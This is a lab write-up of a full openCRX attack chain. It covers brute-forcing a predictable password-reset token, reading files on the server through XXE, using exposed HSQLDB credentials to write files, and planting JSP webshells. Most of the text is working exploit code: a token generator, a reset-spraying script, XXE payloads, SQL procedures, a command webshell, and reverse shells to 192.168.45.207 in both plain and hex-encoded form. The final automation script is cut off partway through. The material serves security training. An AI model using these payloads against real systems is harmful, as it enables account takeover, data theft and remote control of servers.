# openCRX Authentication Bypass and Remote Code Execution

This article analyzes and exploits several vulnerabilities in [openCRX](http://www.opencrx.org/), an open-source customer relationship management application written in Java.

The audit begins with white-box analysis of a deterministic password-reset token, which is used to obtain authenticated application access. After authentication, an XML External Entity vulnerability is combined with exposed HSQLDB functionality to write a JSP WebShell and achieve remote code execution.

The complete chain is:

```text
Predictable password-reset token
    ↓
Authenticated openCRX access
    ↓
XXE file and directory disclosure
    ↓
HSQLDB credentials and remote database access
    ↓
Java Language Routine
    ↓
Arbitrary file write
    ↓
JSP WebShell
    ↓
Remote code execution
```


## Lab Preparation

Add an `opencrx` entry to the Kali Linux hosts file and restore the openCRX lab virtual machine before beginning.

| URL | Username | Password |
| --- | --- | --- |
| `http://opencrx:8080/opencrx-core-CRX` | `admin-Standard` | `admin-Standard` |
| `ssh://opencrx` | `student` | `studentlab` |

Connect over SSH, enter the TomEE `bin` directory, and start the application with the `run` argument:

```console
kali@kali:~$ ssh student@opencrx
student@opencrx's password:

student@opencrx:~$ cd crx/apache-tomee-plus-7.0.5/bin
student@opencrx:~/crx/apache-tomee-plus-7.0.5/bin$ ./opencrx.sh run
[Server@5caf905d]: Startup sequence initiated from main() method
[Server@5caf905d]: Could not load properties from file
[Server@5caf905d]: Using cli/default properties only
[Server@5caf905d]: Initiating startup sequence...
```


## Password-Reset Vulnerability Discovery

openCRX runs on [Apache TomEE](https://tomee.apache.org/). Java Web applications may be packaged as JAR, WAR, or EAR files. All three formats are ZIP archives with different purposes:

- Java Archive files, or JARs, normally contain standalone applications or libraries.
- Web Application Archives, or WARs, combine JARs with static Web content such as HTML.
- Enterprise Application Archives, or EARs, may contain multiple JARs and WARs and therefore bundle several Web applications into one deployable unit.

The packaging format does not change whether a vulnerability is exploitable, but it determines where application code and shared libraries must be found during analysis.

Inspect the deployed application structure with `tree`:

```console
student@opencrx:~$ cd crx/apache-tomee-plus-7.0.5/
student@opencrx:~/crx/apache-tomee-plus-7.0.5$ tree -L 3
.
|-- airsyncdir
|-- apps
|   |-- opencrx-core-CRX
|   |   |-- APP-INF
|   |   |-- META-INF
|   |   |-- opencrx-bpi-CRX.war
|   |   |-- opencrx-calendar-CRX.war
|   |   |-- opencrx-contacts-CRX.war
|   |   |-- opencrx-core-CRX.war
|   |   |-- opencrx-documents-CRX.war
|   |   |-- opencrx-rest-CRX.war
|   |-- opencrx-core-CRX.ear
|-- bin
...
55 directories, 339 files
```

The application is packaged as `/home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear`. Copy it to Kali and extract it:

```console
kali@kali:~$ scp student@opencrx:~/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX.ear .
opencrx-core-CRX.ear  100%  85MB

kali@kali:~$ unzip -q opencrx-core-CRX.ear -d opencrx
```

The EAR contains the individual WAR files and shared libraries under `APP-INF/lib`. Open the main `opencrx-core-CRX.war` in JD-GUI.

![Figure 1: Viewing opencrx-core-CRX.war in JD-GUI](./assets/opencrx-authentication-bypass-rce/358ddd818aa1138f3e8cb2916690ff36-opencrx_jdgui_01.png)

A Java deployment descriptor such as `web.xml` is often the best starting point for mapping URLs to servlets. In this application, JSP files are also important because they mix application logic with HTML. A servlet is a class that receives requests and returns responses; Java Server Pages are dynamic servlets that embed Java code into HTML.

JD-GUI reveals several JSP files related to authentication and password reset.

![Figure 2: Authentication-related JSP files](./assets/opencrx-authentication-bypass-rce/9fa188b66e24ccd84d6be5e1390242dc-opencrx_jdgui_01a.png)

Authentication and password-reset flaws frequently provide the first authenticated foothold, after which post-authentication functionality can be reviewed. `RequestPasswordReset.jsp` calls `requestPasswordReset()` on a `UserHome` object:

```java
if(principalName != null && providerName != null && segmentName != null) {
    javax.jdo.PersistenceManagerFactory pmf =
        org.opencrx.kernel.utils.Utils.getPersistenceManagerFactory();
    javax.jdo.PersistenceManager pm = pmf.getPersistenceManager(
        SecurityKeys.ADMIN_PRINCIPAL + SecurityKeys.ID_SEPARATOR + segmentName,
        null
    );
    try {
        org.opencrx.kernel.home1.jmi1.UserHome userHome =
            (org.opencrx.kernel.home1.jmi1.UserHome)pm.getObjectById(
                new Path("xri://@openmdx*org.opencrx.kernel.home1")
                    .getDescendant(
                        "provider", providerName,
                        "segment", segmentName,
                        "userHome", principalName
                    )
            );
        pm.currentTransaction().begin();
        userHome.requestPasswordReset();
        pm.currentTransaction().commit();
        success = true;
    } catch(Exception e) {
        try {
            pm.currentTransaction().rollback();
        } catch(Exception ignore) {}
        success = false;
    }
}
```

The `UserHome` definition is not linked because it lives outside the current WAR. The EAR deployment descriptor identifies the shared library directory:

```xml
<application id="opencrx-core-CRX-App"
    xmlns="http://java.sun.com/xml/ns/javaee"
    version="5">
    <display-name>openCRX EAR</display-name>
    <module id="opencrx-core-CRX">
        <web>
            <web-uri>opencrx-core-CRX.war</web-uri>
            <context-root>opencrx-core-CRX</context-root>
        </web>
    </module>
    <library-directory>APP-INF/lib</library-directory>
</application>
```

`opencrx-kernel.jar` contains `UserHome`.

![Figure 3: Viewing opencrx-kernel.jar](./assets/opencrx-authentication-bypass-rce/d26867cefe882c1322e63bde5ba65a06-opencrx_jdgui_02.png)

`UserHome` is an interface: it defines required methods but not their implementation. To determine what the call executes, search the entire JAR for `requestPasswordReset` and include methods in the search.

![Figure 4: Searching for requestPasswordReset](./assets/opencrx-authentication-bypass-rce/dfa6e82d05b0e32010de0b56f4ff6cb4-opencrx_jdgui_03.png)

`UserHomeImpl` implements the interface and delegates to `UserHomes`:

```java
public Void requestPasswordReset() {
    try {
        UserHomes.getInstance().requestPasswordReset(
            (UserHome)sameObject()
        );
        return newVoid();
    } catch (ServiceException e) {
        throw new JmiServiceException(e);
    }
}
```

The backend method generates a token, places it in confirmation and cancellation URLs, and stores it through `changePassword`:

```java
public void requestPasswordReset(UserHome userHome)
        throws ServiceException {
    String webAccessUrl = userHome.getWebAccessUrl();
    if (webAccessUrl != null) {
        String resetToken = Utils.getRandomBase62(40);
        String resetConfirmUrl = webAccessUrl
            + (webAccessUrl.endsWith("/") ? "" : "/")
            + "PasswordResetConfirm.jsp?t=" + resetToken
            + "&p=" + providerName
            + "&s=" + segmentName
            + "&id=" + principalName;

        changePassword(
            (Password)loginPrincipal.getCredential(),
            null,
            "{RESET}" + resetToken
        );
    }
}
```

Following `getRandomBase62` exposes the root cause:

```java
public static String getRandomBase62(int length) {
    String alphabet =
        "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    Random random = new Random(System.currentTimeMillis());
    String s = "";
    for (int i = 0; i < length; i++) {
        s = s + alphabet.charAt(random.nextInt(62));
    }
    return s;
}
```


### When Random Is Not Random

Java provides both `java.util.Random` and `java.security.SecureRandom`. `Random` creates a deterministic pseudorandom sequence: two instances initialized with the same seed and used with the same method sequence return identical values. Its documentation explicitly states that it is not cryptographically secure.

This behavior can be demonstrated in JShell:

```console
jshell> import java.util.Random;
jshell> Random r1 = new Random(42);
jshell> Random r2 = new Random(42);
jshell> for(int i=0; i<10; i++) {
   ...>   int x = r1.nextInt();
   ...>   int y = r2.nextInt();
   ...>   if(x == y) System.out.println("They match! " + x);
   ...> }
They match! -1170105035
They match! 234785527
They match! -1360544799
...
```

`SecureRandom`, by contrast, is designed to provide cryptographically strong, non-deterministic output. Even when two instances receive the same caller-supplied byte array, their native entropy sources produce different output:

```java
jshell> import java.security.SecureRandom;
jshell> byte[] s = new byte[] { (byte) 0x2a };
jshell> SecureRandom r1 = new SecureRandom(s);
jshell> SecureRandom r2 = new SecureRandom(s);
jshell> if(r1.nextInt() == r2.nextInt()) {
   ...>   System.out.println("They match!");
   ...> } else {
   ...>   System.out.println("No match.");
   ...> }
No match.
```

openCRX uses ordinary `Random` and seeds it with `System.currentTimeMillis()`, the number of milliseconds since the Unix epoch. If the token-generation time can be bounded, an attacker can instantiate equivalent `Random` objects for every likely millisecond and reproduce every candidate token. Without rate limiting or lockout, those candidates can then be submitted until one succeeds.

#### Exercises

1. Reproduce the JShell examples.
2. Compare ten outputs from two `SecureRandom` objects.


### Identifying an Account

The default openCRX installation includes these account pairs:

1. `guest / guest`
2. `admin-Standard / admin-Standard`
3. `admin-Root / admin-Root`

The login and password-reset pages return distinguishable messages for valid and invalid accounts. A reset request for a valid account reports success.

![Figure 5: Password reset for a valid account](./assets/opencrx-authentication-bypass-rce/c09bc40371c0b984b98381e7b997e4f1-opencrx_reset_valid.png)

An invalid account produces an error.

![Figure 6: Password reset for an invalid account](./assets/opencrx-authentication-bypass-rce/8130a0bb3f7912266011672b1721733e-opencrx_reset_invalid.png)

This response difference confirms that `guest` exists and also provides a general account-enumeration oracle.


### Determining the Reset Time

The seed is the exact millisecond at which the token is generated. `System.currentTimeMillis()` is already UTC-based, so time-zone conversion is unnecessary.

Run `date +%s%3N` immediately before and after the reset request. `%s` supplies epoch seconds and `%3N` adds three subsecond digits, producing milliseconds. Include response headers so the server's `Date` header can be used as a sanity check:

```console
kali@kali:~$ date +%s%3N && \
curl -s -i -X POST \
  --data-binary 'id=guest' \
  'http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp' && \
date +%s%3N
1582038122371
HTTP/1.1 200
Date: Tue, 18 Feb 2020 15:02:02 GMT
Server: Apache TomEE
...
1582038122769
```

The token seed lies between `1582038122371` and `1582038122769`, a range of 398 candidates. Network and server latency affect the range, although token generation occurs early in the reset flow and is therefore normally closer to the start time.

![Figure 7: Converting the Date header to epoch milliseconds](./assets/opencrx-authentication-bypass-rce/9ac3bbc2fdbbbd4e39afc5e1fd943be3-opencrx_timestamp_01.png)

The HTTP `Date` header has only second precision, so its converted value ends in `000`. It cannot replace the local millisecond measurements, but it verifies that the local and server clocks are close enough for the attack.


### Generating Candidate Tokens

Create `OpenCRXToken.java`. The class accepts the candidate seed range and reproduces the application algorithm:

```java
import java.util.Random;

public class OpenCRXToken {
    public static void main(String args[]) {
        int length = 40;
        long start = Long.parseLong("1582038122371");
        long stop = Long.parseLong("1582038122769");

        for (long seed = start; seed < stop; seed++) {
            System.out.println(getRandomBase62(length, seed));
        }
    }

    public static String getRandomBase62(int length, long seed) {
        String alphabet =
            "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        Random random = new Random(seed);
        String token = "";

        for (int i = 0; i < length; i++) {
            token += alphabet.charAt(random.nextInt(62));
        }
        return token;
    }
}
```

Compile it and save every candidate:

```console
kali@kali:~/opencrx$ javac OpenCRXToken.java
kali@kali:~/opencrx$ java OpenCRXToken > tokens.txt
kali@kali:~/opencrx$ tail tokens.txt
SCKF9pp15wUrAZj84eC7m3Z1P5PexTb9wUetcF4T
OA1Otn7zkpspZ7pa3kIxSFsKcRdRelTKaQhmPkf3
...
vMSsitoJwnrHnfB00BneUoeGxMxiQPj3UjkCnBNi
```

#### Exercises

1. Complete the `OpenCRXToken` class and generate a token list.
2. Update it to accept `start` and `stop` as command-line parameters.


### Automating the Reset

The source reveals the confirmation URL format:

```text
PasswordResetConfirm.jsp?t=<token>&p=<provider>&s=<segment>&id=<principal>
```

`RequestPasswordReset.jsp` suggests an identifier such as `guest@CRX/Standard`. `WizardInvoker.jsp` confirms that `CRX` is the provider and `Standard` is the segment.

![Figure 8: Password reset form](./assets/opencrx-authentication-bypass-rce/93ca7b984edae6545cd902e1d97bd7a1-opencrx_reset_source.png)

`PasswordResetConfirm.jsp` consumes `t`, `p`, `s`, `id`, `password1`, and `password2`. The following script sprays the generated tokens and stops when the response no longer contains the failure message:

```python
#!/usr/bin/python3

import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--user', required=True)
parser.add_argument('-p', '--password', required=True)
args = parser.parse_args()

target = (
    "http://opencrx:8080/opencrx-core-CRX/"
    "PasswordResetConfirm.jsp"
)

print("Starting token spray. Standby.")
with open("tokens.txt", "r") as token_file:
    for candidate in token_file:
        payload = {
            't': candidate.rstrip(),
            'p': 'CRX',
            's': 'Standard',
            'id': args.user,
            'password1': args.password,
            'password2': args.password,
        }

        response = requests.post(target, data=payload)
        if "Unable to reset password" not in response.text:
            print(
                "Successful reset with token: %s"
                % candidate.rstrip()
            )
            break
```

```console
$ ./OpenCRXReset.py -u guest -p password
Starting token spray. Standby.
Successful reset with token: yzs4pCxiRTym9Srs6OrzUY0b9HtEnDK8SrPtjBUe
```

Log in as `guest` with the new password to verify success.

![Figure 9: Authenticated as guest](./assets/opencrx-authentication-bypass-rce/6118430908b3b7933703cddc36f993f4-opencrx_logged_in.png)

The reset process generates alerts. A real assessment should account for those artifacts. Thousands of rapid requests are also noisy and may overload the service, so production testing requires agreed rate limits and pacing.

#### Exercises

1. Reset the `guest` account.
2. Reset the `admin-Standard` account.
3. As an advanced exercise, automate the complete reset chain and remove the generated reset alerts.


## XML External Entity Vulnerability Discovery

After obtaining authenticated access, inspect the REST API under **Wizards > Explore API**.

![Figure 10: openCRX API Explorer](./assets/opencrx-authentication-bypass-rce/c59bf379add3222f6cea6165efe61cc4-opencrx_apis_01.png)

The Swagger interface documents endpoints and request bodies. Several endpoints accept both JSON and XML, making the XML parser a valuable target.


### XML Fundamentals

XML encodes data in a form readable by both humans and machines. A basic document contains an XML declaration and nested elements:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<contact>
  <firstName>Tom</firstName>
  <lastName>Jones</lastName>
</contact>
```

Applications that consume XML call a parser or processor to interpret the markup and return structured data. Like every component that processes attacker-controlled input, an XML parser can behave dangerously when given malformed or malicious data. Depending on language and configuration, XML parsing flaws can enable information disclosure, SSRF, denial of service, command injection, or remote code execution.


### XML Entities

A Document Type Definition can declare XML entities. An entity acts like a reusable placeholder: the parser replaces an entity reference with its declared content.

#### Internal Entity

Internal entities are defined locally inside the DTD:

```xml
<!ENTITY name "entity_value">
<!ENTITY test "<entity-value>test value</entity-value>">
```

The declaration uses special `<!ENTITY ...>` syntax and does not have a closing XML tag. Its value may itself contain valid XML.

#### External Entity

External entities reference content through a URI. A private external entity uses `SYSTEM`:

```xml
<!ENTITY name SYSTEM "URI">
<!ENTITY offsecinfo SYSTEM "http://www.offsec.com/company.xml">
```

A public external entity uses `PUBLIC` and may include a public identifier that helps the processor resolve an alternate URI:

```xml
<!ENTITY name PUBLIC "public_id" "URI">
<!ENTITY offsecinfo PUBLIC
  "-//W3C//TEXT companyinfo//EN"
  "http://www.offsec.com/companyinfo.xml">
```

#### Parameter Entity

Parameter entities exist only inside a DTD. They use a `%` prefix and can compose other DTD declarations:

```xml
<!ENTITY % name SYSTEM "URI">
<!ENTITY % course "AWAE">
<!ENTITY Title "Offensive Security presents %course;">
```

#### Unparsed External Entity

An entity may reference non-XML data. `NDATA` prevents the parser from treating that content as markup:

```xml
<!ENTITY name SYSTEM "URI" NDATA TYPE>
<!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>
```

Unparsed entities can reference binary content. This can be important in Web applications whose I/O stream handling is less flexible than PHP-style wrappers.


### Understanding XXE

An external entity can access local or remote resources through its system identifier. XXE occurs when an attacker can supply a crafted XML document and force the parser to resolve an external entity that points to sensitive data.

Different techniques can exfiltrate text or binary content and may also support SSRF. Some languages expose wrappers that turn XXE into command execution. In Java, XXE alone does not directly execute code, so this case uses it as a file and directory disclosure primitive that unlocks a second vulnerability.


### Finding an Attack Vector

First verify entity expansion with an internal entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY>
<!ENTITY lastname "Replaced">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

The parser replaces `&lastname;` with `Replaced`. If the field is returned by the API or shown in the application, the expansion is observable.

Accounts are a useful target because their API accepts XML and contains visible text fields.

![Figure 11: Manage Accounts](./assets/opencrx-authentication-bypass-rce/32c26ee5e67cf5a63b1a795bd4e56cea-opencrx_xxe_01.png)

![Figure 12: Explore API](./assets/opencrx-authentication-bypass-rce/70bec283a71ceb1c158ba204cbea0172-opencrx_xxe_02.png)

Swagger lists a large model, but the openCRX documentation provides a minimal request:

![Figure 13: Inspecting the model](./assets/opencrx-authentication-bypass-rce/3ede30f34f4de2e7bb22c866cc040364-opencrx_xxe_03.png)

```xml
<?xml version="1.0"?>
<org.opencrx.kernel.account1.Contact>
  <lastName>REST</lastName>
  <firstName>Test #1</firstName>
</org.opencrx.kernel.account1.Contact>
```

![Figure 14: Minimal POST body](./assets/opencrx-authentication-bypass-rce/e48a267d65cede6429329ea03eedb676-opencrx_xxe_04.png)

Send the internal-entity version through Burp Repeater. The response confirms that the parser expands the entity.

![Figure 15: Confirming entity expansion](./assets/opencrx-authentication-bypass-rce/38a23d07676b7882acd428db7fec4c40-opencrx_xxe_05.png)

Replace the entity with a file-backed external entity:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY>
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

The request returns an error.

![Figure 16: Reading /etc/passwd](./assets/opencrx-authentication-bypass-rce/5491078c84af53a1a8cafd1408ef18e1-opencrx_xxe_06.png)

The response contains the generated SQL statement and `/etc/passwd` inside the attempted field value. A later `java.sql.SQLDataException` reports right truncation in `FULL_NAME`: the parser successfully read the file, but the database column was too short. Even though the contact is not created, the verbose error message discloses the file contents.

XXE can also list directories because Java's `File` class represents both files and directories:

```xml
<?xml version="1.0"?>
<!DOCTYPE contact [
  <!ENTITY probe SYSTEM "file:///home/">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>
  XXE_FILE_START
  &probe;
  XXE_FILE_END
  </lastName>
  <firstName>Probe</firstName>
</org.opencrx.kernel.account1.Contact>
```

![[Pasted image 20260715211125.png]]

![[Pasted image 20260715211738.png]]

The following helper repeatedly reads a requested path and extracts content between markers:

```python
import re
import requests
from textwrap import dedent

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

url = (
    "http://192.168.109.126:8080/opencrx-rest-CRX/"
    "org.opencrx.kernel.account1/provider/CRX/segment/"
    "Standard/account"
)

while True:
    file_path = input("Please input file path: ")
    xml_payload = dedent(f'''\
        <?xml version="1.0"?>
        <!DOCTYPE contact [
        <!ENTITY probe SYSTEM "file:///{file_path}">
        ]>
        <org.opencrx.kernel.account1.Contact>
        <lastName>XXE_FILE_START
        &probe;
        XXE_FILE_END</lastName>
        <firstName>Probe</firstName>
        </org.opencrx.kernel.account1.Contact>
    ''')

    response = requests.post(
        url,
        data=xml_payload.encode("utf-8"),
        auth=("admin-Standard", "Chenduo2010"),
        proxies=proxies,
    )
    match = re.search(
        r'XXE_FILE_START\s*(.*?)\s*XXE_FILE_END',
        response.text,
        flags=re.DOTALL,
    )
    print(match.group(1).strip() if match else "No file content found")
```

#### Exercises

1. Reproduce the XXE attack.
2. Use it to list directories and enumerate the server filesystem.
3. Build a parser that cleanly extracts file contents from the error response.


### CDATA and XML Files

Simple text files can be read directly, but content containing XML delimiters such as `<` and `>` can break the surrounding document. XML escaping cannot solve this when the attacker cannot modify the referenced file.

A CDATA section begins with `<![CDATA[` and ends with `]]>`. Everything between those markers is treated as text rather than markup. Wrapping the target file in CDATA therefore preserves a well-formed outer document.

Create start and end entities plus a file entity. Directly concatenating the three entities causes a parser error, and one entity cannot reference another inside the same DTD in the required way. Use a parameter entity to load an external DTD that defines a wrapper:

```text
<!ENTITY wrapper "%start;%file;%end;">
```

Save it as `/var/www/html/wrapper.dtd`, start Apache, and send:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM
  "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml">
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.45.207/wrapper.dtd">
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

The parser downloads `wrapper.dtd`, expands the three parameter entities, and inserts the CDATA-wrapped file into `lastName`. If the value is too large, the verbose database error still contains it.

![Figure 17: Reading tomcat-users.xml with a CDATA wrapper](./assets/opencrx-authentication-bypass-rce/3a51676ecdebed2f1aee5478d8584aa6-opencrx_xxe_07.png)

#### Exercise

Implement the wrapper payload and use it to read an XML file.


### Obtaining Remote HSQLDB Access

The Tomcat Manager is restricted to localhost.

![Figure 18: Tomcat Manager access denied](./assets/opencrx-authentication-bypass-rce/10116750e606df58d2f7f5ded11962ca-opencrx_xxe_07a.png)

XXE-based SSRF does not immediately solve this because the disclosed users do not have the roles required by this Tomcat Manager version. Continue filesystem enumeration instead.

![Figure 19: Directory listing through XXE](./assets/opencrx-authentication-bypass-rce/09183d19c8e8d773e0b9b13a3d373155-opencrx_xxe_07b.png)

`/home/student/crx/data/hsqldb/dbmanager.sh` contains an HSQLDB connection string and credentials.

![Figure 20: Reading dbmanager.sh](./assets/opencrx-authentication-bypass-rce/57645c1b328c6831a5bbb6167186438d-opencrx_xxe_08.png)

```text
jdbc:hsqldb:hsql://127.0.0.1:9001/CRX
user: sa
password: manager99
```

HSQLDB normally relies on an ACL or network controls in addition to credentials. `crx.properties` does not define an ACL.

![Figure 21: Reading crx.properties](./assets/opencrx-authentication-bypass-rce/d2f5d79c999c93dde99b4401455e3db2-opencrx_xxe_09.png)

Verify that TCP 9001 is reachable:

```console
kali@kali:~/opencrx$ nmap -p 9001 opencrx
PORT     STATE SERVICE
9001/tcp open  tor-orport
```

Download the matching HSQLDB JAR and launch its database manager:

```console
java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing \
  --url jdbc:hsqldb:hsql://opencrx:9001/CRX \
  --user sa \
  --password manager99
```

![Figure 22: HSQL Database Manager](./assets/opencrx-authentication-bypass-rce/6413dedbf04c941a48fee926beaada1a-opencrx_hsql_01.png)

HSQLDB does not provide a MySQL-style `SELECT INTO OUTFILE`, but its custom SQL routines can invoke Java code.

#### Exercise

Connect to the remote HSQLDB service.


### Java Language Routines

A Java Language Routine can call a static Java method that is available on the database process classpath. Only supported primitive values and simple Java objects that map to SQL types may be used as parameters or return values.

Java is object-oriented, but it also has eight primitive data types such as `int` and `float`. Primitives do not need `new`; each also has a corresponding object wrapper such as `Integer` or `Float`.

A JRT may be a function or a procedure. A Java method that returns a value can be exposed as a function and used in a SQL expression. A method returning `void` must be exposed as a procedure and invoked with `CALL`.


## Remote Code Execution

First create a proof-of-concept function around the static `System.getProperty(String)` method:

```sql
CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR
  LANGUAGE JAVA
  DETERMINISTIC NO SQL
  EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
```

The function accepts a SQL `VARCHAR`, maps it to the Java `String` argument named `key`, and returns another `VARCHAR`. Create it in HSQL Database Manager.

![Figure 23: Creating the systemprop function](./assets/opencrx-authentication-bypass-rce/afcfa9787608a08ded98415210db2d5c-opencrx_hsql_02.png)

Call it with a `VALUES` clause, which does not require selecting from a table:

```sql
VALUES(systemprop('java.class.path'))
```

![Figure 24: Calling systemprop](./assets/opencrx-authentication-bypass-rce/583bae6a7d05dabdcead596dab0747dd-opencrx_hsql_03.png)

The listed classpath contains only `hsqldb.jar`, but a Java process can always access core Java classes. A useful method must satisfy all of these constraints:

1. It must be static.
2. Its arguments must be primitives or types that map to SQL.
3. Its return type must be a primitive, a mappable object, or `void`.
4. It must directly execute useful behavior or write a file.

Before Java 9, standard classes live in `lib/rt.jar`. Export its source from JD-GUI and search with a regular expression such as `public static void \w+\(String`. This locates public static methods returning `void` whose first argument is a `String`.

![Figure 25: Searching candidate methods](./assets/opencrx-authentication-bypass-rce/afba799581435136370e19ac23c30ec4-opencrx_hsql_03b.png)

Among 215 results, `com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename` meets the requirements:

```java
public static void writeBytesToFilename(
        String filename,
        byte[] bytes) {
    FileOutputStream output = null;
    try {
        if (filename != null && bytes != null) {
            File file = new File(filename);
            output = new FileOutputStream(file);
            output.write(bytes);
            output.close();
        }
    } catch (IOException exception) {
        if (output != null) {
            try {
                output.close();
            } catch (IOException ignored) {}
        }
    }
}
```

It returns `void`, accepts a filename and byte array, creates the file, and writes the supplied bytes. HSQLDB maps `VARCHAR` to `String` and `VARBINARY` to `byte[]`. Use `VARBINARY` rather than fixed-size `BINARY`, because fixed-size binary values are padded with zero bytes and may corrupt the output.

```sql
CREATE PROCEDURE writeBytesToFilename(
    IN paramString VARCHAR,
    IN paramArrayOfByte VARBINARY(1024)
)
  LANGUAGE JAVA
  DETERMINISTIC NO SQL
  EXTERNAL NAME
  'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
```

Validate it with the ASCII hex representation of `It worked!`:

```sql
CALL writeBytesToFilename(
  'test.txt',
  CAST('497420776f726b656421' AS VARBINARY(1024))
)
```

Retrieve the database working directory:

![Figure 26: Inspecting the database working directory](./assets/opencrx-authentication-bypass-rce/4e435a724597f46be0a451017986e4f2-opencrx_hsql_04.png)

```sql
VALUES(systemprop('user.dir'))
```

Use XXE to confirm that `test.txt` was created.

#### Exercises

1. Create the procedure and write a test file.
2. Verify the new file through XXE.


### Finding a Web-Accessible Write Location

Arbitrary file write is not yet code execution because there is no direct way to launch an uploaded binary. Use XXE directory listing to locate the deployed JSP directory. Writing a JSP into that directory makes it accessible through the Web server.

#### Exercise

Use XXE to locate the directory containing the JSP files for `opencrx-core-CRX`.


### Writing a WebShell

Adapt a JSP command shell for Linux and keep it below the 1024-byte `VARBINARY` limit:

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";

if (cmd != null) {
    String line = null;
    try {
        Process process = Runtime.getRuntime().exec(cmd);
        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream())
        );
        while ((line = reader.readLine()) != null) {
            output += line;
        }
    } catch (IOException exception) {
        exception.printStackTrace();
    }
}
%>
<pre><%=output %></pre>
```

Convert the JSP to ASCII hex and write it into the deployed application:

```sql
CALL writeBytesToFilename(
  '../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell.jsp',
  CAST('<JSP_ASCII_HEX>' AS VARBINARY(1024))
)
```

Request the shell and pass `hostname` as `cmd`:

```console
kali@kali:~$ curl \
  'http://opencrx:8080/opencrx-core-CRX/shell.jsp?cmd=hostname'

<pre>
opencrx
</pre>
```

The command shell can be upgraded to an interactive reverse shell. One option is to Base64-encode the callback command and URL-encode it when calling the JSP:

```bash
payload='bash -i >& /dev/tcp/192.168.45.207/1234 0>&1'
encoded=$(printf %s "$payload" | base64 -w0)

curl -G \
  --data-urlencode \
  "cmd=bash -c {echo,$encoded}|{base64,-d}|{bash,-i}" \
  'http://opencrx:8080/opencrx-core-CRX/shell.jsp'
```

A smaller JSP can launch the callback immediately when requested:

```jsp
<%new ProcessBuilder(
  "/bin/bash",
  "-c",
  "bash -i >& /dev/tcp/192.168.45.207/1234 0>&1"
).start();%>
```

Write its encoded form as `rev_shell1.jsp` through the same HSQLDB procedure.

#### Exercises

1. Update the command shell for Linux and write it to the server.
2. Upgrade command execution to a fully interactive shell.


## Complete Automation

The final lab automation measures the token-generation window, reproduces the Java PRNG in Python, resets the target password, reads the HSQLDB connection script with XXE, creates the Java file-write procedure, writes a JSP callback, and requests it.

`sql_payload_01.sql`:

```sql
\.
DROP PROCEDURE writeBytesToFilename IF EXISTS;
CREATE PROCEDURE writeBytesToFilename(
  IN paramString VARCHAR,
  IN paramArrayOfByte VARBINARY(1024)
)
LANGUAGE JAVA
DETERMINISTIC NO SQL
EXTERNAL NAME
'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
.;
```

`sql_payload_02.sql`:

```sql
\.
CALL writeBytesToFilename(
  '../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/rev_shell1.jsp',
  CAST(
    '3c256e65772050726f636573734275696c64657228222f62696e2f62617368222c222d63222c2262617368202d69203e26202f6465762f7463702f3139322e3136382e34352e3230372f3132333420303e263122292e737461727428293b253e'
    AS VARBINARY(1024)
  )
)
.;
```

Python exploit script:

```python
import re
import requests
import subprocess
import sys
import time
import javarandom
from textwrap import dedent


def send_reset_password_request():
    print("\nStart password reset request")
    response = requests.post(
        url + "RequestPasswordReset.jsp",
        data={"id": "admin-Standard@CRX/Standard"},
        proxies=proxies,
    )

    success = (
        "You should receive a notification e-mail within the next minutes."
        in response.text
    )
    if not success:
        print("Password reset request failed")
        sys.exit(1)


def get_random_base62(random_object, length):
    alphabet = (
        "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    )
    token = ""
    for _ in range(length):
        token += alphabet[random_object.nextInt(62)]
    return token


def reset_password(start_time, end_time):
    print("\nStart password reset confirmation")

    for seed in range(start_time, end_time):
        token = get_random_base62(javarandom.Random(seed), 40)
        data = {
            "t": token,
            "p": provider,
            "s": segment,
            "id": username,
            "password1": password,
            "password2": password,
        }
        response = requests.post(
            url + "PasswordResetConfirm.jsp",
            data=data,
            proxies=proxies,
        )
        response.raise_for_status()

        if "Password successfully changed for" in response.text:
            print("Password successfully changed")
            return

    print("Password change failed")
    sys.exit(1)


def obtain_reverse_shell():
    print("Using the new password to log in")

    file_path = "home/student/crx/data/hsqldb/dbmanager.sh"
    xml_payload = dedent(f'''\
        <?xml version="1.0"?>
        <!DOCTYPE contact [
        <!ENTITY probe SYSTEM "file:///{file_path}">
        ]>
